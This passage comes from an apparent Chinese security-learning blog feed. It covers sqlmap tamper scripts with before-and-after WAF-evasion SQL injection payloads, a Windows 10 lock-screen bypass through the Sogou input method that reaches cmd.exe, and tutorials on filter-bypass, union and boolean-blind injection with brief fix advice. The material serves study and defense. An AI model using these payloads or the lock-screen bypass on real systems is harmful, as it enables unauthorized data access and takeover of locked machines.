class="line">/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CH/**/AR(58,100,114,117,58))#</span><br></pre></td></tr></table></figure><p>（28）halfvesionedmorekeyword.py</p><p>作用：当数据库为mysql时，绕过防火墙，在每个关键字前添加MySQL版本注释</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value&#x27; UNION ALL SELECT CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)),NULL,NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,104,116,116,58),/*!0IFNULL(CAST(CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;QDWa&#x27;=&#x27;QDWa</span><br></pre></td></tr></table></figure><p>该脚本可在MySQL4.018和MySQL5.022数据库中使用</p><p>（29）space2morehash.py</p><p>作用：将空格替换为井字号，并添加一个随机字符串和换行符</p><p>使用脚本前语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 9227=9227</span><br></pre></td></tr></table></figure><p>使用脚本后语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%23ngNvzqu%0Aand%23nVNaVoPYeva%0A%23 lujYFWfv%0A9227=9227</span><br></pre></td></tr></table></figure><p>该脚本可在MySQL5.1.41数据库中使用</p><p>（30）apostrophenullencode.py</p><p>作用：用非法双字节unicode字符替换单引号</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND %00%271%00%27=%00%271</span><br></pre></td></tr></table></figure><p>（31）appendnullbyte.py</p><p>作用：在有效符合的结束位置加载零字节字符编码</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AND 1=1%00</span><br></pre></td></tr></table></figure><p>（32）chardoubleencode.py</p><p>作用：对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</p><p>使用脚本前的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM%20TABLE</span><br></pre></td></tr></table></figure><p>使用脚本后的语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</span><br></pre></td></tr></table></figure><p>（33）unmagicquotes.py</p><p>作用：用一个多字节组合（%bf%27）和末尾通用注释一起替换空格。</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ AND 1=1</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%bf%27--</span><br></pre></td></tr></table></figure><p>（34）randomcomments.py</p><p>作用：用“&#x2F;**&#x2F;”分割SQL关键字</p><p>使用脚本前语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT</span><br></pre></td></tr></table></figure><p>使用脚本后语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN/**/S/**/ERT</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜狗输入法绕过windows锁屏复现</title>
      <link href="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="搜狗输入法绕过window锁屏复现"><a href="#搜狗输入法绕过window锁屏复现" class="headerlink" title="搜狗输入法绕过window锁屏复现"></a>搜狗输入法绕过window锁屏复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>window10环境（我这里使用的虚拟机环境）</p><p>搜狗输入法最新版</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>这个漏洞很早之前就存在，相关文章参考</p><p><a href="https://wooyun.xyz/bug_detail.php?wybug_id=wooyun-2015-0130018">https://wooyun.xyz/bug_detail.php?wybug_id=wooyun-2015-0130018</a></p><p>回到正题</p><p>在window10锁屏界面点击屏幕键盘，切换搜狗输入法，并将键盘拖动到输入法附近，使输入法的图标显示出来。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141033893.png" class="" title="image-20240802141033893"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141051153.png" class="" title="image-20240802141051153"><p>之后打开菜单，点击游戏中心，之后没下载游戏中心的会下载，之后随便点一个跳转登录页面，我们点击qq手机版登录。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141654592.png" class="" title="image-20240802141654592"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141716598.png" class="" title="image-20240802141716598"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802141823532.png" class="" title="image-20240802141823532"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142031208.png" class="" title="image-20240802142031208"><p>之后我们会跳转到qq的下载页面，我们点击window下载，发现会弹出来下载位置的文件夹。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142101700.png" class="" title="image-20240802142101700"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142325381.png" class="" title="image-20240802142325381"><p>之后我们去c盘：windows&#x2F;system32&#x2F;cmd.exe,那么我们就可以实现cmd拿取终端了。</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142634054.png" class="" title="image-20240802142634054"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142725833.png" class="" title="image-20240802142725833"><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802142823738.png" class="" title="image-20240802142823738"><p>那么引申一下；百度输入法》超会写》ai创作》设置》词库》导入阅读选项也可以打开文件夹完成以上操作，同样谷歌输入法也存在该漏洞。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该漏洞产生原因是微软屏幕键盘相关程序主动以特权接口加载第三方中文输入法导致</p><p>该漏洞于8月1日在微信群大量传播，8月2日复现时，搜狗输入法已通知微软相关安全团队，并采取了主动规避措施（在window登录界面下搜狗输入法将主动退出执行，且在界面上已无法看到游戏中心）</p><img src="/2024/08/02/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E7%BB%95%E8%BF%87windows%E9%94%81%E5%B1%8F%E5%A4%8D%E7%8E%B0/image-20240802143317404.png" class="" title="image-20240802143317404"><p>文章参考：<a href="https://mp.weixin.qq.com/s/-jcJAkfK_DnQut6ou_dkkA">https://mp.weixin.qq.com/s/-jcJAkfK_DnQut6ou_dkkA</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的绕过和修复建议</title>
      <link href="/2024/08/01/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2024/08/01/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入绕过技术"><a href="#sql注入绕过技术" class="headerlink" title="sql注入绕过技术"></a>sql注入绕过技术</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>当访问id&#x3D;1 and 1&#x3D;1时返回no back，尝试使用任意关键字大小写绕过，比如将and大写AND（任意字母大小写都可以aNd、And都行），如果id&#x3D;1 And 1&#x3D;1返回与id&#x3D;1相同结果，id&#x3D;2 And 1&#x3D;2返回与id&#x3D;1不同的结果，说明存在SQL注入。后续命令如果被拦截，都进行一定的大小写尝试绕过。</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果访问id&#x3D;1‘报错，后续访问id&#x3D;1’ and 1&#x3D;1也报错，且返回报错的信息只有“1&#x3D;1”没有and的话，说明and被过滤了，尝试大小写绕过，如果不成功，就尝试双写的方式绕过，比如anandd 1&#x3D;1，当anandd被过滤中间的and后，就只剩下了and，所以这时传入数据库中的语句是and 1&#x3D;1，后续思路大差不差，通过返回的报错信息来双写相关语句。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>访问id&#x3D;1‘，发现报错，访问id&#x3D;1 and 1&#x3D;1和id&#x3D;1 and 1&#x3D;2时，发现关键字and被拦截，先使用大小写和双写的方法尝试绕过，不行的话，将关键词进行URL<strong>全编码</strong>（这里URL编码要编码两次，因为服务器会自动对url进行一次url解码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#url编码和全编码的区别</span><br><span class="line"></span><br><span class="line">#url编码</span><br><span class="line">#定义</span><br><span class="line">URL编码将URL中的非ASCII字符和特殊字符转换为 % 符号后跟两位十六进制数字的形式。例如，空格会被编码为 %20，问号 ? 会被编码为 %3F。</span><br><span class="line"></span><br><span class="line">#示例</span><br><span class="line">如果URL被编码，例如 http://example.com/path?param=value 可能会变成 http://example.com/path?param%3Dvalue，其中非ASCII字符和特殊字符转换为 % 符号后跟两位十六进制数字的形式。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#url全编码</span><br><span class="line">#定义</span><br><span class="line">全编码是指将URL中的所有字符（包括协议，域名，路径和查询参数等）都进行URL编码处理。这种方式将整个URL的所有部分都转换为安全的ASCII字符形式。</span><br><span class="line"></span><br><span class="line">#示例</span><br><span class="line">如果整个URL都被全编码，例如 http://example.com/path?param=value 可能会变成 http%3A%2F%2Fexample.com%2Fpath%3Fparam%3Dvalue，其中所有字符都经过了URL编码处理。</span><br></pre></td></tr></table></figure><p>and进行两次url全编码后的结果是%25%36%31%25%36%45%25%36%34，所以如果访问id&#x3D;1 %25%36%31%25%36%45%25%36%34 1&#x3D;1返回与id&#x3D;1相同的结果，访问id&#x3D;1 %25%36%31%25%36%45%25%36%34 1&#x3D;2返回与id&#x3D;1不同的结果，说明该网址存在SQL注入漏洞。</p><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>访问id&#x3D;1‘，返回MySQL报错，接着访问and 1&#x3D;1和and 1&#x3D;2，发现存在关键字拦截，前三种方法都不行时，就尝试使用内联注释绕过，当我们访问以下内容时，页面返回与id&#x3D;1相同结果，(相关介绍请看前一篇内容mysql相关知识点章节)，后续看返回结果确定漏洞存在与否。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 /*!and*/ 1=1</span><br><span class="line"></span><br><span class="line">id=1 /*!and*/ 1=2</span><br></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>过滤危险字符</p><p>使用预编译语句</p>]]></content>
      
      
      <categories>
          
          <category> top10漏洞 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入相关学习</title>
      <link href="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>前端向后端发送某些数据，后端在向数据库发送sql语句请求时，如果没有对相关参数进行严格过滤，则有可能会导致危险的SQL语句被输入数据库中进行查询，从而导致数据库被未授权增删改查。</p><h2 id="sql注入要素"><a href="#sql注入要素" class="headerlink" title="sql注入要素"></a>sql注入要素</h2><p>1.输入内容的位置没有做限制，用户可以自由控制输入的内容。（参数用户可控）</p><p>2.用户输入的内容可以被带入数据库中执行。（参数带入数据库查询）</p><p>以后端php语句为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id = $_GET[&#x27;id&#x27;]&quot;;</span><br></pre></td></tr></table></figure><p>那么这里的参数id就是可控的，我们可以任意拼接sql语句进行攻击。</p><p>当传入的ID参数为1’时，数据库执行的代码如下图所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1&#x27;</span><br></pre></td></tr></table></figure><p>这行sql语句不符合数据库语句规范，所以会产生报错。当传入的ID参数为1 and 1&#x3D;1时，执行的SQL语句如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and 1=1  #当为真时</span><br><span class="line">select * from users where id = 1 and 1=2  #当为假时</span><br></pre></td></tr></table></figure><p>因为1&#x3D;1为真，所以where语句中id&#x3D;1也为真所以会返回和id&#x3D;1相同的结果。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727114202322.png" class="" title="image-20240727114202322"><p>因为1&#x3D;2为假，所以where语句中id&#x3D;1也为假所以会返回和id&#x3D;1不同的结果。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727114217816.png" class="" title="image-20240727114217816"><p>这里放一个参考表</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727115824592.png" class="" title="image-20240727115824592"><h2 id="MySQL相关知识点"><a href="#MySQL相关知识点" class="headerlink" title="MySQL相关知识点"></a>MySQL相关知识点</h2><h3 id="库名、表名、字段名"><a href="#库名、表名、字段名" class="headerlink" title="库名、表名、字段名"></a>库名、表名、字段名</h3><p>MySQL5.0版本之后，会在数据库中默认存放一个<strong>information_schema</strong>的数据库，在这之中，有三个表名需要记住，分别是<strong>SCHEMATA</strong>、<strong>TABLES</strong>和<strong>COLUMNS</strong>。</p><h4 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a>SCHEMATA</h4><p><strong>SCHEMATA</strong>表储存用户创建的所有数据库的库名，我需要记住该表中记录数据库库名的字段名为<strong>SCHEMA_NAME（库名）</strong></p><h4 id="TABLES"><a href="#TABLES" class="headerlink" title="TABLES"></a>TABLES</h4><p><strong>TABLES</strong>表储存该用户创建的所有数据库的库名和表名，我们需要记住该表中记录数据库的库名和表名的字段名分别为<strong>TABLE_SCHEMA（库名）</strong>和<strong>TABLE_NAME（表名）</strong>。</p><h4 id="COLUMNS"><a href="#COLUMNS" class="headerlink" title="COLUMNS"></a>COLUMNS</h4><p><strong>COLUMNS</strong>表储存用户创建的所有库名、表名和字段名，我们需要记住其中的<strong>TABLE_SCHEMA（库名）</strong>、<strong>TABLE_NAME（表名）</strong>和<strong>COLUMN_NAME（字段名）</strong>。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727110242528.png" class="" title="image-20240727110242528"><h3 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h3><p>在不知道任何条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名</span><br></pre></td></tr></table></figure><p>在已知一条条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名 WHERE 已知条件的字段名=&#x27;已知条件的值&#x27;</span><br></pre></td></tr></table></figure><p>在已知两条条件时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名，表名 WHERE 已知条件一的字段名=&#x27;已知条件一的值&#x27; AND 已知条件二的字段名=&#x27;已知条件二的值&#x27;</span><br></pre></td></tr></table></figure><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727105718625.png" class="" title="image-20240727105718625"><h3 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h3><p>limit的使用格式为limit m,n；其中m是记录开始的位置，从0开始记录，n是值取n条记录。例如limit 0,1是指从第一条记录开始，取一条记录。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727105920048.png" class="" title="image-20240727105920048"><h3 id="要记住的几个函数"><a href="#要记住的几个函数" class="headerlink" title="要记住的几个函数"></a>要记住的几个函数</h3><p>database（）：当前网站使用的数据库</p><p>version（）：当前mysql版本</p><p>user（）：当前mysql用户</p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>mysql常见注释符表达方式：#或者–空格或者&#x2F;**&#x2F;。</p><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式:/*!code*/</span><br></pre></td></tr></table></figure><p>内联注释可以用于整个SQL语句中，用来执行sql语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</span><br></pre></td></tr></table></figure><p>内联注释可以用来写入语句中的某一位置来完成绕过。</p><hr><h2 id="联合注入-Union"><a href="#联合注入-Union" class="headerlink" title="联合注入(Union)"></a>联合注入(Union)</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>首先通过手注 1&#x2F;1’ 和 1 and 1&#x3D;1&#x2F;1 and 1&#x3D;2 判断是否存在SQL注入，如果&#x2F;左右两边的参数输入后两次的返回结果不一致，则说明存在sql注入。（这里建议使用bp的repeater查看返回包。）</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727120546402.png" class="" title="image-20240727120546402"><p>之后使用order by 1-99语句查询该数据表的字段行数，例如，如果访问id&#x3D;1 order by 3，页面返回与id&#x3D;1相同的结果，则说明有第三行，如果访问id&#x3D;1 order by 4,页面返回与id&#x3D;1不同的结果，则说明不存在第四行，所以行数为三行。</p><img src="/2024/07/27/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240727120518311.png" class="" title="image-20240727120518311"><p>由于是将数据输出到页面上的，所以可以使用联合查询（union注入），并通过order by查询结果，我们可以通过访问以下内容来查看查看回显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">#这里的+会被解析成空格，使注释符后的内容不被解析，同理，--%20也一样，或者将#换成%23也一样。</span><br><span class="line">#id=-1的原因是因为数据库中没有id=-1的数据，所以我们将id的值变成-1，那么回显就会显示我们union select查询的结果。</span><br></pre></td></tr></table></figure><p>查看回显时如果返回了2：3，说明可以在2和3的位置输入mysql语句，比如使用database（），可以查看返回的数据库信息（这里的返回信息是数据库类型），之后就可以获取数据了。</p><p>获取库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br><span class="line">#这里的group_concat是将数据库中的内容拼接成一行回显。</span><br></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#limit 0,1获取的是第一行的表名，如果要获取第二行的表名，结合前边提到的limit的使用，就使用limit 1,1。</span><br><span class="line">#如果想要全部回显，就是用前边提到的group_concat函数。</span><br></pre></td></tr></table></figure><p>获取字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#获取其他字段名和上述步骤同理</span><br></pre></td></tr></table></figure><p>获取字段数据</p><p>拿到库名，表名和字段名之后，我们就可以构造SQL语句获取具体的值了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><p>这里把相关查询语句总结放在这里（Union注入）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=1 order by 4</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=-1&#x27; union select 1,2,3</span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;mysql&#x27; and table_name=&#x27;usernames&#x27; limit 0,1            </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">select username_id from mysql.usernames limit 0,1</span><br></pre></td></tr></table></figure><h2 id="布尔盲注-Boolean"><a href="#布尔盲注-Boolean" class="headerlink" title="布尔盲注(Boolean)"></a>布尔盲注(Boolean)</h2><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p><strong>判断长度</strong></p><p>首先通过在id&#x3D;1后边添加单引号来判断是否存在SQL注入，之后在通过拼接and 1&#x3D;1%23和and 2&#x3D;2%23再次查看（这里%23是#注释符，用于将后边代码命令注释掉）。</p><p>如果发现返回包中的返回结果只有yes或者no说明，无法返回数据，只能返回yes或者no，那么合理我们就只能使用Boolean盲注。</p><p>首先来判断数据库名长度，id&#x3D;1后拼接以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and length(database())=1--+ </span><br><span class="line"></span><br><span class="line">#有单引号所以需要注释符来注释，1的位置上可以是任何数字，这里用不同的数字查看返回的结果，如果是yes说明长度是该数字，如果是no说明长度不是该数字。（这里数字的含义是大于等于该数字）</span><br></pre></td></tr></table></figure><p><strong>查询库名</strong></p><p>接着逐字符判断的方式来获取数据库库名，数据库苦命范围一般在a<del>z，0</del>9之间，可能会加一些特殊字符，字母不区分大小写，相关语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;m&#x27;--+</span><br><span class="line"></span><br><span class="line">#这里的substr意思是截取database()的值，从第一个字符开始，每次返回一个。</span><br><span class="line">#substr和limit不一样，substr是从1开始排序，而limit是从0开始排序</span><br></pre></td></tr></table></figure><p>之后使用burp的爆破功能爆破其中的’t’的值，通过返回包返回yes或者no来判断是否是该值。</p><p>也可以使用ASCII码的方式进行查询，s的ASCII码是115，mysql的ASCII转换函数是ascii()，那么语句就可以改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>那么后边的数据库库名就可以逐步判断了，假如我们前边判断库名长度为5，那么就要往后判断5位，相关语句也要修改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and substr(database(),2,1)=&#x27;y&#x27;--+</span><br><span class="line"></span><br><span 